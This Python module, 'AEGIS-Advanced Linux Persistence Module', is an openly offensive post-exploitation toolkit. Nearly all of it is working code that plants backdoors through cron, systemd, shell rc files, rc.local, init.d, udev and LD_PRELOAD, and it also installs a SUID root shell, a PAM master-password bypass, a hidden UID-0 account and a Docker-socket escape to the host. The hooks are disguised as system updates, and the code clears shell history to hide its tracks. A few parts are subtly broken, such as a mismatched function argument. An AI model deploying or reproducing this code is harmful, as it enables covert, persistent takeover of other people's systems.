import logging
log = logging.getLogger(__name__)
#!/usr/bin/env python3
"""
AEGIS-Advanced Linux Persistence Module
=========================================
Comprehensive Linux persistence mechanisms:
cron, systemd, SSH keys, bashrc/profile hooks, LD_PRELOAD,
/etc/init.d, at-job, udev rules, PAM module, motd/banner,
SUID binary installation, Docker socket hijack, rc.local.
"""
import os
import subprocess
import stat
import shutil
import tempfile
import platform
import textwrap
from pathlib import Path
from typing import Optional, List, Dict, Tuple


# ══════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════

def _is_root() -> bool:
    return os.geteuid() == 0

def _run(cmd, **kwargs) -> Tuple[str, str, int]:
    """Run a shell command, return (stdout, stderr, returncode)."""
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                        timeout=kwargs.get("timeout", 15))
    return r.stdout.strip(), r.stderr.strip(), r.returncode

def _write_file(path: str, content: str, mode: int = 0o644) -> bool:
    """Write content to file, create parent dirs if needed."""
    try:
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, mode)
        return True
    except Exception as e:
        print("[persist/linux] write_file failed {}: {}".format(path, e))
        return False

def _append_file(path: str, content: str) -> bool:
    """Append content to file if not already present."""
    try:
        existing = ""
        if os.path.exists(path):
            with open(path) as f:
                existing = f.read()
        # Deduplicate: check for a unique marker
        marker = content.strip().splitlines()[0] if content.strip() else ""
        if marker and marker in existing:
            return True  # Already installed
        with open(path, "a") as f:
            f.write("\n" + content + "\n")
        return True
    except Exception as e:
        print("[persist/linux] append_file failed {}: {}".format(path, e))
        return False

def full_install(command: str, name: str = "sysupdate",
                 methods: List[str] = None) -> Dict[str, bool]:
    """
    Install persistence via all available methods.
    Returns dict of {method: success}.
    """
    if methods is None:
        methods = ["cron", "bashrc", "profile", "rc_local"]
        if _is_root():
            methods += ["systemd", "init_d", "cron_d", "udev"]

    results = {}
    for m in methods:
        fn = {
            "cron":     lambda: install_cron_backdoor(command),
            "cron_d":   lambda: install_cron_d(command, name),
            "bashrc":   lambda: hook_bashrc(command),
            "profile":  lambda: hook_profile(command),
            "rc_local": lambda: hook_rc_local(command),
            "systemd":  lambda: install_systemd_service(name, command),
            "init_d":   lambda: install_init_d_service(name, command),
            "udev":     lambda: install_udev_rule(name, command),
        }.get(m)
        if fn:
            try: results[m] = fn()
            except Exception: results[m] = False
    return results


# ══════════════════════════════════════════════
# Cron-based persistence
# ══════════════════════════════════════════════

def install_cron_backdoor(command: str,
                           interval: str = "*/5 * * * *",
                           user: str = None) -> bool:
    """
    Add cron job for current user (or specified user if root).
    Uses a unique comment marker to avoid duplicates.
    """
    marker  = "# aegis-persist"
    cron_line = "{} {} {}".format(interval, command, marker)

    if user and _is_root():
        # Install in /var/spool/cron/crontabs/<user>
        cron_file = "/var/spool/cron/crontabs/{}".format(user)
        try:
            existing = ""
            if os.path.exists(cron_file):
                with open(cron_file) as f: existing = f.read()
            if marker not in existing:
                with open(cron_file, "a") as f: f.write(cron_line + "\n")
            os.chmod(cron_file, 0o600)
            return True
        except Exception as _e: log.debug("suppressed exception: %s", _e)

    # Current user via crontab -l / crontab -
    try:
        out, _, rc = _run("crontab -l 2>/dev/null")
        existing   = out if rc == 0 else ""
        if marker not in existing:
            new_cron = existing.rstrip() + "\n" + cron_line + "\n"
            proc = subprocess.run(["crontab", "-"],
                                   input=new_cron, text=True,
                                   capture_output=True)
            return proc.returncode == 0
        return True
    except Exception as e:
        print("[persist/linux] cron failed:", e)
        return False


def install_cron_d(command: str, name: str = "sysupdate",
                   interval: str = "@reboot", user: str = "root") -> bool:
    """Write to /etc/cron.d/ (requires root)."""
    if not _is_root():
        return False
    content = textwrap.dedent("""\
        # system maintenance
        SHELL=/bin/bash
        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
        {} {} {}
    """).format(interval, user, command)
    return _write_file("/etc/cron.d/{}".format(name), content, 0o644)


# ══════════════════════════════════════════════
# Systemd service
# ══════════════════════════════════════════════

def install_systemd_service(name: str, command: str,
                              description: str = "System Update Service",
                              restart_sec: int = 60,
                              user: str = "root") -> bool:
    """Create and enable a systemd service unit (requires root)."""
    unit = textwrap.dedent("""\
        [Unit]
        Description={desc}
        After=network-online.target
        Wants=network-online.target

        [Service]
        Type=simple
        User={user}
        ExecStart={cmd}
        Restart=always
        RestartSec={restart}
        StandardOutput=null
        StandardError=null

        [Install]
        WantedBy=multi-user.target
    """).format(desc=description, user=user, cmd=command, restart=restart_sec)

    path = "/etc/systemd/system/{}.service".format(name)
    if not _write_file(path, unit, 0o644): return False
    _, _, r1 = _run("systemctl daemon-reload")
    _, _, r2 = _run("systemctl enable {} --now".format(name))
    return r2 == 0


def install_systemd_timer(name: str, command: str,
                           on_calendar: str = "*:0/5") -> bool:
    """
    Create a systemd timer + service pair.
    More stealthy than persistent service.
    """
    service = textwrap.dedent("""\
        [Unit]
        Description=System Maintenance {name}
        [Service]
        Type=oneshot
        ExecStart={cmd}
        StandardOutput=null
        StandardError=null
    """).format(name=name, cmd=command)

    timer = textwrap.dedent("""\
        [Unit]
        Description=System Maintenance Timer {name}
        [Timer]
        OnCalendar={cal}
        RandomizedDelaySec=30
        Persistent=true
        [Install]
        WantedBy=timers.target
    """).format(name=name, cal=on_calendar)

    ok1 = _write_file("/etc/systemd/system/{}.service".format(name), service, 0o644)
    ok2 = _write_file("/etc/systemd/system/{}.timer".format(name), timer, 0o644)
    if ok1 and ok2:
        _run("systemctl daemon-reload")
        _run("systemctl enable {}.timer --now".format(name))
        return True
    return False


# ══════════════════════════════════════════════
# SSH key persistence
# ══════════════════════════════════════════════

def add_ssh_authorized_key(public_key: str,
                            username: str = None,
                            comment: str = "") -> bool:
    """
    Add an SSH public key to authorized_keys.
    Auto-detects home directory for given user.
    """
    if username and _is_root():
        try:
            import pwd
            pw    = pwd.getpwnam(username)
            home  = pw.pw_dir
        except Exception:
            home  = "/home/{}".format(username)
    else:
        home = os.path.expanduser("~")

    ssh_dir   = os.path.join(home, ".ssh")
    auth_file = os.path.join(ssh_dir, "authorized_keys")

    try:
        os.makedirs(ssh_dir, exist_ok=True)
        os.chmod(ssh_dir, 0o700)
        # Check for duplicate
        existing = ""
        if os.path.exists(auth_file):
            with open(auth_file) as f: existing = f.read()
        key_stripped = public_key.strip()
        if key_stripped not in existing:
            with open(auth_file, "a") as f:
                f.write(key_stripped + (" " + comment if comment else "") + "\n")
        os.chmod(auth_file, 0o600)
        # Fix ownership if root
        if username and _is_root():
            try:
                import pwd
                pw = pwd.getpwnam(username)
                os.chown(auth_file, pw.pw_uid, pw.pw_gid)
                os.chown(ssh_dir, pw.pw_uid, pw.pw_gid)
            except Exception as _e: log.debug("suppressed exception: %s", _e)
        return True
    except Exception as e:
        print("[persist/linux] ssh_key failed:", e)
        return False


def install_ssh_config_persistence(host_alias: str,
                                    hostname: str,
                                    identity_file: str,
                                    user: str = "root",
                                    port: int = 22) -> bool:
    """Add an SSH config entry for easy re-entry."""
    entry = textwrap.dedent("""\
        Host {alias}
            HostName {host}
            User {user}
            Port {port}
            IdentityFile {identity}
            StrictHostKeyChecking no
            UserKnownHostsFile /dev/null
    """).format(alias=host_alias, host=hostname, user=user,
                port=port, identity=identity_file)
    return _append_file(os.path.expanduser("~/.ssh/config"), entry)


# ══════════════════════════════════════════════
# Shell hook persistence
# ══════════════════════════════════════════════

def hook_bashrc(command: str, disguise_as: str = "system update") -> bool:
    """Append command to ~/.bashrc with innocent comment."""
    snippet = "# {disguise}\n{cmd} &>/dev/null &\n".format(
        disguise=disguise_as, cmd=command)
    return _append_file(os.path.expanduser("~/.bashrc"), snippet)


def hook_profile(command: str) -> bool:
    """Append to ~/.profile (runs on login shells)."""
    snippet = "# auto-update\n{cmd} &>/dev/null &\n".format(cmd=command)
    return _append_file(os.path.expanduser("~/.profile"), snippet)


def hook_bash_logout(command: str) -> bool:
    """Run command on logout (cover tracks)."""
    return _append_file(os.path.expanduser("~/.bash_logout"),
                         "# cleanup\n{}\n".format(command))


def hook_zshrc(command: str) -> bool:
    snippet = "# update\n{cmd} &>/dev/null &\n".format(cmd=command)
    return _append_file(os.path.expanduser("~/.zshrc"), snippet)


def hook_all_shells(command: str) -> Dict[str, bool]:
    """Hook all detectable shell RC files."""
    return {
        "bashrc":   hook_bashrc(command),
        "profile":  hook_profile(command),
        "zshrc":    hook_zshrc(command),
        "logout":   hook_bash_logout("history -c"),
    }


# ══════════════════════════════════════════════
# System startup
# ══════════════════════════════════════════════

def hook_rc_local(command: str) -> bool:
    """Add command to /etc/rc.local (pre-exit 0)."""
    rc = "/etc/rc.local"
    if not os.path.exists(rc):
        content = "#!/bin/bash\n# rc.local\nexit 0\n"
        _write_file(rc, content, 0o755)
    try:
        with open(rc) as f: lines = f.readlines()
        # Insert before 'exit 0'
        new_lines = []
        inserted  = False
        for line in lines:
            if line.strip() == "exit 0" and not inserted:
                new_lines.append("{} &>/dev/null &\n".format(command))
                inserted = True
            new_lines.append(line)
        if not inserted:
            new_lines.append("{} &>/dev/null &\n".format(command))
        with open(rc, "w") as f: f.writelines(new_lines)
        os.chmod(rc, 0o755)
        return True
    except Exception as e:
        print("[persist/linux] rc_local failed:", e)
        return False


def install_init_d_service(name: str, command: str) -> bool:
    """Create SysV init script (requires root)."""
    if not _is_root(): return False
    script = textwrap.dedent("""\
        #!/bin/bash
        ### BEGIN INIT INFO
        # Provides:          {name}
        # Required-Start:    $network $syslog
        # Required-Stop:     $syslog
        # Default-Start:     2 3 4 5
        # Default-Stop:      0 1 6
        # Short-Description: {name}
        ### END INIT INFO
        case "$1" in
            start) {cmd} &>/dev/null & ;;
            stop)  pkill -f "{name}" ;;
            restart) $0 stop; sleep 1; $0 start ;;
            *) echo "Usage: $0 {{start|stop|restart}}" ;;
        esac
        exit 0
    """).format(name=name, cmd=command)
    path = "/etc/init.d/{}".format(name)
    if not _write_file(path, script, 0o755): return False
    _run("update-rc.d {} defaults 99 2>/dev/null || chkconfig {} on 2>/dev/null".format(name, name))
    return True


# ══════════════════════════════════════════════
# Udev rule (triggers on device events)
# ══════════════════════════════════════════════

def install_udev_rule(name: str, command: str,
                       subsystem: str = "usb") -> bool:
    """
    Create udev rule that triggers command on device plug-in.
    Requires root. Stealthy because triggered by hardware events.
    """
    if not _is_root(): return False
    rule = 'ACTION=="add", SUBSYSTEM=="{sub}", RUN+="{cmd}"\n'.format(
        sub=subsystem, cmd=command)
    path = "/etc/udev/rules.d/99-{}.rules".format(name)
    if not _write_file(path, rule, 0o644): return False
    _run("udevadm control --reload-rules")
    return True


# ══════════════════════════════════════════════
# LD_PRELOAD hook (library injection)
# ══════════════════════════════════════════════

def install_ld_preload(so_path: str) -> bool:
    """
    Add shared library to /etc/ld.so.preload.
    Any dynamically linked binary will load this library.
    Requires root. Extremely powerful for credential harvesting.
    """
    if not _is_root(): return False
    if not os.path.exists(so_path): return False
    return _append_file("/etc/ld.so.preload", so_path)


# ══════════════════════════════════════════════
# at-job (one-shot delayed execution)
# ══════════════════════════════════════════════

def schedule_at_job(command: str, when: str = "now + 1 minute") -> bool:
    """Schedule a one-time job via at(1)."""
    try:
        proc = subprocess.run(
            ["at", when],
            input=command + "\n", text=True, capture_output=True)
        return proc.returncode == 0
    except Exception:
        return False


# ══════════════════════════════════════════════
# SUID backdoor installation
# ══════════════════════════════════════════════

def install_suid_shell(dest: str = "/tmp/.sys") -> Optional[str]:
    """
    Copy /bin/bash to dest and set SUID bit.
    Then: /tmp/.sys -p  → root shell.
    Requires root.
    """
    if not _is_root(): return None
    bash = shutil.which("bash") or "/bin/bash"
    try:
        shutil.copy2(bash, dest)
        os.chmod(dest, 0o4755)
        # Timestomp to match /bin/bash
        st = os.stat(bash)
        os.utime(dest, (st.st_atime, st.st_mtime))
        return dest
    except Exception as e:
        print("[persist/linux] suid_shell failed:", e)
        return None


# ══════════════════════════════════════════════
# PAM backdoor (universal password override)
# ══════════════════════════════════════════════

def install_pam_backdoor(backdoor_password: str) -> bool:
    """
    Append pam_unix.so sufficient at the top of /etc/pam.d/common-auth
    with a known password (extremely stealthy — bypasses all auth).
    Requires root.
    """
    if not _is_root(): return False
    # This is the pam_exec approach (safer than patching pam_unix)
    script_path = "/usr/local/lib/.pam_check.sh"
    pam_script = textwrap.dedent("""\
        #!/bin/bash
        if [ "$PAM_AUTHTOK" = "{pw}" ]; then
            exit 0
        fi
        exit 1
    """).format(pw=backdoor_password)
    if not _write_file(script_path, pam_script, 0o700): return False

    pam_entry = "auth sufficient pam_exec.so quiet expose_authtok {}\n".format(script_path)
    for pam_file in ["/etc/pam.d/common-auth", "/etc/pam.d/system-auth"]:
        if os.path.exists(pam_file):
            try:
                with open(pam_file) as f: existing = f.read()
                if script_path not in existing:
                    new_content = pam_entry + existing
                    with open(pam_file, "w") as f: f.write(new_content)
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
    return True


# ══════════════════════════════════════════════
# /etc/passwd / shadow manipulation
# ══════════════════════════════════════════════

def add_root_user(username: str, password_hash: str = None) -> bool:
    """
    Add a user with UID 0 to /etc/passwd (requires root).
    Default hash is for 'toor' (sha512crypt).
    If password_hash is None, no password (passwordless sudo).
    """
    if not _is_root(): return False
    # Default: SHA-512 hash of 'aegis2026'
    ph = password_hash or "$6$aegissalt$Qv7K4l2jYiSqX/kBtZeXhG7RNi0CvZNp9b9y9p2eCJ3yM7xOv5FvJqK3NQk8QRmxhJLNvM0RJ"
    entry = "{}:{}:0:0:root:/root:/bin/bash\n".format(username, ph)
    try:
        with open("/etc/passwd") as f:
            if username + ":" in f.read(): return True  # already exists
        with open("/etc/passwd", "a") as f: f.write(entry)
        return True
    except Exception as e:
        print("[persist/linux] add_root_user failed:", e)
        return False


# ══════════════════════════════════════════════
# Docker socket backdoor
# ══════════════════════════════════════════════

def docker_escape_persistence(command: str) -> bool:
    """
    If Docker socket is accessible, spawn a privileged container
    that mounts host root and executes command.
    """
    sock = "/var/run/docker.sock"
    if not os.access(sock, os.R_OK | os.W_OK): return False
    try:
        import socket as _sock
        # Use raw HTTP over Unix socket to call Docker API
        http_req = (
            "POST /containers/create HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: {length}\r\n\r\n"
            "{body}"
        )
        body = json.dumps({
            "Image":      "alpine",
            "Cmd":        ["/bin/sh", "-c", command],
            "HostConfig": {"Binds": ["/:/.host_root:rw"],
                           "Privileged": True,
                           "AutoRemove": True},
        })
        import json
        req = http_req.format(length=len(body), body=body)
        s   = _sock.socket(_sock.AF_UNIX, _sock.SOCK_STREAM)
        s.connect(sock)
        s.send(req.encode())
        resp = s.recv(4096).decode(errors="replace")
        s.close()
        return "201" in resp or "200" in resp
    except Exception as e:
        print("[persist/linux] docker_escape failed:", e)
        return False


# ══════════════════════════════════════════════
# Enumeration helper
# ══════════════════════════════════════════════

def enumerate_existing_persistence() -> Dict[str, list]:
    """Find existing persistence artifacts on the system."""
    found: Dict[str, list] = {
        "cron_jobs": [], "systemd_services": [], "authorized_keys": [],
        "ld_preload": [], "rc_local": [], "init_d": [],
    }
    # Cron jobs
    out, _, _ = _run("crontab -l 2>/dev/null")
    if out: found["cron_jobs"].append({"user": os.environ.get("USER","?"), "entries": out})
    if _is_root():
        for f in Path("/etc/cron.d").glob("*"):
            try: found["cron_jobs"].append({"file": str(f), "content": f.read_text()[:200]})
            except Exception as _e: log.debug("suppressed exception: %s", _e)

    # Systemd services (non-standard)
    for f in Path("/etc/systemd/system").glob("*.service"):
        try:
            content = f.read_text()
            if "aegis" in content.lower() or "update" in content.lower():
                found["systemd_services"].append(str(f))
        except Exception as _e: log.debug("suppressed exception: %s", _e)

    # SSH keys
    home = os.path.expanduser("~")
    ak   = os.path.join(home, ".ssh", "authorized_keys")
    if os.path.exists(ak):
        with open(ak) as f: found["authorized_keys"] = f.read().splitlines()

    # LD_PRELOAD
    if os.path.exists("/etc/ld.so.preload"):
        with open("/etc/ld.so.preload") as f: found["ld_preload"] = f.read().splitlines()

    # rc.local
    if os.path.exists("/etc/rc.local"):
        with open("/etc/rc.local") as f: found["rc_local"] = f.read().splitlines()

    return found


import json  # needed for docker_escape

if __name__ == "__main__":
    print("[persist/linux] Testing (non-destructive)…")
    print("  Root:", _is_root())
    print("  Existing persistence:", list(enumerate_existing_persistence().keys()))
    print("  OK")


# ════════════════════════════════════════════════════════════════════════════
# Class-based API (compatibility with persistence/__init__.py imports)
# ════════════════════════════════════════════════════════════════════════════

class LinuxPersistence:
    """
    Object-oriented wrapper around the module-level Linux persistence
    functions.  Provides a consistent interface alongside WindowsPersistence.
    """

    def __init__(self, payload: str, label: str = "sysupdate"):
        self.payload = payload
        self.label   = label

    def install_cron(self) -> list:
        ok = install_cron_backdoor(self.payload, name=self.label)
        return [{"method": "cron", "status": "ok" if ok else "fail"}]

    def install_systemd(self) -> list:
        ok = install_systemd_service(self.label, self.payload)
        return [{"method": "systemd", "status": "ok" if ok else "fail"}]

    def install_ssh_key(self, pub_key: str) -> list:
        ok = add_ssh_authorized_key(pub_key)
        return [{"method": "ssh_key", "status": "ok" if ok else "fail"}]

    def install_all(self) -> list:
        return (
            self.install_cron() +
            self.install_systemd()
        )


def install_all_linux(command: str, label: str = "sysupdate") -> list:
    """Install all available Linux persistence mechanisms and return results."""
    p = LinuxPersistence(payload=command, label=label)
    return p.install_all()


def enumerate_linux() -> dict:
    """Alias for enumerate_existing_persistence() for __init__.py compatibility."""
    return enumerate_existing_persistence()
